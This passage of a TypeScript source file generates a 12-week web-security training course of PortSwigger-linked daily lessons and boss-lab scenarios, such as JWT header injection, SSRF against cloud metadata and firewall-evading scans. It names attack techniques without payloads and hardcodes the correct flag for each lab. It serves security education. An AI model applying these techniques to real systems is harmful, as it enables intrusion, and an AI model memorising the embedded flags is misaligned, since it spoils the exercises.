        { name: "Monday", title: "Negative & Fractional Cart Quantities", lab: "https://portswigger.net/web-security/logic-flaws" },
        { name: "Tuesday", title: "Discount Code & Gift Card Race Conditions", lab: "https://portswigger.net/web-security/logic-flaws" },
        { name: "Wednesday", title: "Multi-Step Workflow Interception & Out-of-Order Execution", lab: "https://portswigger.net/web-security/logic-flaws" },
        { name: "Thursday", title: "Trusting Client-side Controlled Pricing Parameters", lab: "https://portswigger.net/web-security/logic-flaws" },
        { name: "Friday", title: "Bypassing Limit Restrictions on OTP Verification", lab: "https://portswigger.net/web-security/logic-flaws" },
        { name: "Saturday", title: "Role Transition Flipping via Custom Header Override", lab: "https://portswigger.net/web-security/logic-flaws" }
      ],
      bossLabTitle: "Enterprise Multi-step Transaction Logic Exploit",
      bossLabScenario: "Interfere with a high-stakes banking transaction flow. Reorder the transaction confirmation phase by bypassing step 2 (Verification) and jumping straight to step 3 (Disbursement) with manipulated transaction values.",
      correctFlag: "FLAG{TRANSACTION_WORKFLOW_BYPASS}"
    },
    {
      title: "Session Management & JWT Exploitation",
      competency: "Session & Token Management",
      days: [
        { name: "Monday", title: "JWT None Algorithm Signature Forgery", lab: "https://portswigger.net/web-security/jwt" },
        { name: "Tuesday", title: "Weak Secret Brute-forcing with Hashcat", lab: "https://portswigger.net/web-security/jwt" },
        { name: "Wednesday", title: "JWT JWK Parameter Header Injection", lab: "https://portswigger.net/web-security/jwt" },
        { name: "Thursday", title: "Session Fixation via Overlapping Domains & Subdomains", lab: "https://portswigger.net/web-security/jwt" },
        { name: "Friday", title: "Bypassing SameSite Cookie Protections via CSRF Chain", lab: "https://portswigger.net/web-security/csrf" },
        { name: "Saturday", title: "JWT Key ID (kid) SQL Injection & Command Exec", lab: "https://portswigger.net/web-security/jwt" }
      ],
      bossLabTitle: "JWT Header Injection & Secret Forgery Attack",
      bossLabScenario: "Manipulate a JWT session token by injecting a self-signed key in the JWK header. Craft a matching token indicating your role is 'Administrator' and use it to execute restricted server controls.",
      correctFlag: "FLAG{JWK_HEADER_INJECTION_Pwned}"
    },
    {
      title: "Advanced Subdomain & Port Recon (Go/Linux-focused)",
      competency: "Asset Mapping (Go/Linux)",
      days: [
        { name: "Monday", title: "Automated Subdomain Discovery with Subfinder & Amass", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Tuesday", title: "Advanced DNS Resolution & Wildcard Filtering with Massdns", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Wednesday", title: "Port Scanning at Scale with Naabu and Rustscan", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Thursday", title: "Vhost Fuzzing with ffuf and Custom Wordlists", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Friday", title: "HTTP Probe & Screen Capture Automation using httpx & gowitness", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Saturday", title: "Extracting ASN Blocks & Subnets using whois & jq", lab: "https://portswigger.net/web-security/information-disclosure" }
      ],
      bossLabTitle: "Large Scale Recon & Service Fingerprinting Lab",
      bossLabScenario: "Process raw reconnaissance data from a giant corporate IP range. Identify hidden internal-only web virtual hosts (VHosts), fingerprint outdated servers, and locate the unprotected admin administration port.",
      correctFlag: "FLAG{RECON_VHOST_FFUF_FINGERPRINT}"
    },
    {
      title: "API Reversing & Swagger Auditing",
      competency: "API Security Auditing",
      days: [
        { name: "Monday", title: "Extracting Hidden API Endpoints from Swagger/OAS UI", lab: "https://portswigger.net/web-security/api-testing" },
        { name: "Tuesday", title: "API Parameter Over-Posting & Mass Assignment Attacks", lab: "https://portswigger.net/web-security/api-testing" },
        { name: "Wednesday", title: "Bypassing REST API Authentication Filters via Traversal", lab: "https://portswigger.net/web-security/api-testing" },
        { name: "Thursday", title: "GraphQL Query Cost & Depth Exhaustion Denial of Service", lab: "https://portswigger.net/web-security/api-testing" },
        { name: "Friday", title: "API Object Level Authorization (BOLA) Exploits", lab: "https://portswigger.net/web-security/api-testing" },
        { name: "Saturday", title: "API Method Tampering (GET to PUT/POST Escalation)", lab: "https://portswigger.net/web-security/api-testing" }
      ],
      bossLabTitle: "Enterprise API Schema Reversing & BOLA Lab",
      bossLabScenario: "Analyze an exposed Swagger spec and identify schema objects. Perform dynamic fuzzing to locate an Object Level Authorization vulnerability (BOLA), and change the administrative API configs using PUT method conversion.",
      correctFlag: "FLAG{BOLA_PUT_API_OVERRIDE_VERIFIED}"
    },
    {
      title: "Advanced Parameter Mining & Hidden Inputs",
      competency: "Parameter & Logic Mining",
      days: [
        { name: "Monday", title: "Automated Parameter Mining with Arjun & Param Miner", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Tuesday", title: "Hidden Administrative Parameter Exploits (debug=true)", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Wednesday", title: "HTTP Header Mining for Custom Caching Frameworks", lab: "https://portswigger.net/web-security/web-cache-poisoning" },
        { name: "Thursday", title: "Uncovering Hidden REST Method Overrides (X-HTTP-Method-Override)", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Friday", title: "Query String Manipulation for Host Header Injection", lab: "https://portswigger.net/web-security/host-header-attacks" },
        { name: "Saturday", title: "Mining Hidden Cookies for Dynamic Theme & Template Parsing", lab: "https://portswigger.net/web-security/essential-skills" }
      ],
      bossLabTitle: "Multi-layered Parameter Discovery & Cache Attack",
      bossLabScenario: "Execute a parameter-discovery payload against a cached cloud server front-end. Mine a secret caching header parameter that overrides server cache behavior, allowing you to inject poisoned javascript headers and steal user flags.",
      correctFlag: "FLAG{PARAM_MINED_CACHE_POISON_SUCCESS}"
    },
    {
      title: "Corporate-Grade VDP Reporting & Impact Analysis",
      competency: "Corporate Reporting & VDP",
      days: [
        { name: "Monday", title: "Writing Professional Executive Vulnerability Summaries", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Tuesday", title: "CVSS v3.1/v4.0 Vector String Calculations", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Wednesday", title: "Drafting Standard Step-by-Step Proof of Concepts (PoC)", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Thursday", title: "Proposing Enterprise-grade Remediation & Root Cause Solutions", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Friday", title: "Structuring High-Impact Bug Reports on HackerOne & Bugcrowd", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Saturday", title: "Communicating Critically with Enterprise Security Officers", lab: "https://portswigger.net/web-security/essential-skills" }
      ],
      bossLabTitle: "Enterprise VDP / Vulnerability Report Evaluation",
      bossLabScenario: "Review and evaluate a complex multi-stage prototype pollution and SSRF chain report. Calculate CVSS vectors, write a crystal-clear step-by-step remediation guide, and submit the final security review.",
      correctFlag: "FLAG{VDP_ENTERPRISE_REPORT_SUBMITTED}"
    },
    {
      title: "Advanced Network & Port Recon",
      competency: "Network & Port Recon",
      days: [
        { name: "Monday", title: "Port Scanning Optimization via Nmap Timing & Scans", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Tuesday", title: "Bypassing Firewalls via Source Port & Decoys", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Wednesday", title: "Fingerprinting SSL/TLS Cryptographic Cipher Suites", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Thursday", title: "Banner Grabbing on Encrypted Protocols (SSH, HTTPS)", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Friday", title: "Analyzing ICMP Responses & UDP Port Responses", lab: "https://portswigger.net/web-security/information-disclosure" },
        { name: "Saturday", title: "Network Route Profiling & Traceroute Discovery", lab: "https://portswigger.net/web-security/information-disclosure" }
      ],
      bossLabTitle: "Network Level Firewall Avoidance & Service Scan",
      bossLabScenario: "Design and execute an optimal firewall-evading port scan. Find hidden network services behind strict filtering layers, analyze certificates for target alignment, and verify service integrity.",
      correctFlag: "FLAG{FIREWALL_EVADED_NMAP_SUCCESS}"
    },
    {
      title: "Cloud Infrastructure Security & Auditing",
      competency: "Cloud Infrastructure Auditing",
      days: [
        { name: "Monday", title: "Identifying Public S3 Bucket Policies & File Leakage", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Tuesday", title: "SSRF Exploitation via AWS Instance Metadata v1 (IMDSv1)", lab: "https://portswigger.net/web-security/ssrf" },
        { name: "Wednesday", title: "Bypassing IMDSv2 Token Requirements via Open Redirects", lab: "https://portswigger.net/web-security/ssrf" },
        { name: "Thursday", title: "Misconfigured Azure Blob Container Data Mining", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Friday", title: "Auditing GCP Cloud Function Security & Identity Tokens", lab: "https://portswigger.net/web-security/essential-skills" },
        { name: "Saturday", title: "DNS Hijacking on Unregistered S3 Bucket Bucketeer Subdomains", lab: "https://portswigger.net/web-security/essential-skills" }
      ],
      bossLabTitle: "Cloud SSRF IMDSv2 Multi-Stage Exfiltration Lab",
      bossLabScenario: "Exploit an SSRF vulnerability on an enterprise web host. Leverage a local Open Redirect bypass to obtain a cloud service token from instance metadata, and use that token to download privileged database configuration files.",
      correctFlag: "FLAG{CLOUD_SSRF_IMDSV2_TOKEN_EXFIL}"
    },
    {
      title: "Advanced Chain Vulnerabilities",
      competency: "Advanced Chain Vulnerabilities",
      days: [
        { name: "Monday", title: "Chaining CSRF with Self-XSS for Account Takeover", lab: "https://portswigger.net/web-security/csrf" },
        { name: "Tuesday", title: "Exploiting File Uploads via Path Traversal filename attacks", lab: "https://portswigger.net/web-security/file-upload" },
        { name: "Wednesday", title: "SQL Injection Chained to Local File Inclusion (LFI)", lab: "https://portswigger.net/web-security/sql-injection" },
        { name: "Thursday", title: "SSRF to Internal Admin Panel Blind Exploitation", lab: "https://portswigger.net/web-security/ssrf" },
        { name: "Friday", title: "Chaining Dynamic Template Injection with RCE Filters", lab: "https://portswigger.net/web-security/server-side-template-injection" },
        { name: "Saturday", title: "XXE injection parsing SVG Uploads for System File Extraction", lab: "https://portswigger.net/web-security/xxe" }
      ],
      bossLabTitle: "The Grandmaster Multi-Chain Exploit (LFI to SSRF to RCE)",
      bossLabScenario: "Execute the ultimate hack chain. Leverage a Path Traversal during file upload to place a custom PHP payload, trigger local execution, bypass external security via blind SSRF query parameters, and obtain systemic root access.",
      correctFlag: "FLAG{LFI_SSRF_RCE_GRANDMASTER_PWNED}"
    }
  ];

  for (let w = 0; w < 12; w++) {
    const topicInfo = topics[w];
    const days: DayLesson[] = [];

    for (let d = 0; d < 6; d++) {
      const dayName = topicInfo.days[d].name;
      const dayTitle = topicInfo.days[d].title;
      const labLink = topicInfo.days[d].lab;
      const dayId = `week-${w + 1}-${dayName.toLowerCase()}`;

      const details = getComprehensiveLessonContent(w, d, dayTitle, topicInfo.competency, dayName);

      days.push({
        id: dayId,
        weekIndex: w,
        dayName,
        title: dayTitle,
        durationMinutes: 150, // 30 (Theory) + 90 (Arena) + 30 (Automation)
        unlocked: w === 0 && d === 0, // Week 1 Monday unlocked by default
        completed: false,
        competency: topicInfo.competency,
        theory: {
          title: "Theoretical Principles & Auditing",
          duration: "30 Mins",
          whatYouAreDoing: details.whatYouAreDoing,
          vulnerabilityOrigin: details.vulnerabilityOrigin,
          pentesterFocus: details.pentesterFocus,
          payloadCrafting: details.payloadCrafting,
          burpSuiteSetup: details.burpSuiteSetup,
          blueTeamDefense: details.blueTeamDefense,
          usefulResources: details.usefulResources,
          industryInsight: details.industryInsight,
          developerMindset: `The engineering team prioritizes rapid feature deployment and positive user experience paths. Under deadline pressure, developers assume that parameters originating from their own front-end app or client environment are inherently safe, failing to validate data structures on the server or browser runtime.`,
          psychologicalError: `Implicit Trust Bias & Perimeter Blindness: Assuming that because an interface control (like an input field) limits user actions in standard browsers, malicious actors cannot bypass constraints using proxy tools, cURL, or custom script payloads.`,
          attackVectors: `Audit Code -> Identify Weak Input -> Configure Burp Suite -> Craft Payload -> Run Terminal Exploit -> Capture & Submit Flag.`
        },
        digitalArena: {
          title: "The Digital Arena Playground",
          duration: "90 Mins",
          stepByStepTutorial: details.stepByStepTutorial,
          labLink,
          instructions: `1. Review the step-by-step practical tutorial guide inside the Playground area below.\n2. Read the target code inspection snippet inside the Digital Arena panel.\n3. Write and execute your custom exploit payload directly in the local shell terminal.\n4. Review the execution results and copy the extracted FLAG into the answer verification box.`,
          interactiveConsolePlaceholder: `Enter captured FLAG (e.g. FLAG{...})`,
          correctFlag: `FLAG{${dayName.toUpperCase()}_${topicInfo.competency.replace(/[\s&()\-]/g, "_").toUpperCase()}_SUCCESS}`,
          flagSubmitted: "",
          flagVerified: false
        },
        automation: {
          title: "Automation & VDP Reporting Output",
          duration: "30 Mins",
          pythonScript: details.pythonAutomation,
          bashScript: details.bashAutomation,
          pythonExplanation: `Automating this exploit in Python creates a reusable proof-of-concept script for your bug bounty toolkit.`,
          bashExplanation: `Automating this exploit in Bash allows rapid CLI command-line execution across target IP ranges.`,
          vdpReportTemplate: details.vdpReportTemplate,
          checklist: [
            { id: `${dayId}-check-1`, text: "Audit code origin and payload execution logic", completed: false },
            { id: `${dayId}-check-2`, text: "Execute Python & Bash automation scripts in terminal", completed: false },
            { id: `${dayId}-check-3`, text: "Review CVSS string calculations and submit VDP report", completed: false }
          ],
          committed: false,
          reported: false
        }
      });
    }

    const bossLabId = `week-${w + 1}-boss`;
    const bossLab: BossLab = {
      id: bossLabId,
      weekIndex: w,
      title: topicInfo.bossLabTitle,
      scenario: topicInfo.bossLabScenario,
      targetEnvironmentDescription: `Target System: https://enterprise-gateway-${w + 1}.secure-mesh.corp:8443\nNetwork Architecture: Multi-tenant container orchestration cluster with microservice API endpoints, front-end cache node, and decoupled configuration services.`,
      instructions: `1. Review the system architecture and historical logs provided.\n2. Implement a complete chain attack: find the core client configuration vulnerability, override the payload parameters, execute the target payload to trigger internal reflection, and grab the flag.\n3. Input the captured Boss flag in the prompt below to verify server compromise.\n4. Complete and submit the high-impact VDP report including Description, Impact, and enterprise-grade Remediation.`,
      correctFlag: topicInfo.correctFlag,
      flagSubmitted: "",
      flagVerified: false,
      completed: false,
      vdpReport: {
        title: `CRITICAL Vulnerability Report - ${topicInfo.bossLabTitle}`,
        severity: "Critical",
        description: "",
        remediation: "",
        submitted: false
      }
    };

    weeks.push({
      weekNumber: w + 1,
      title: topicInfo.title,
      unlocked: w === 0, // Week 1 unlocked by default
      completed: false,
      days,
      bossLab
    });
  }

  return weeks;
};
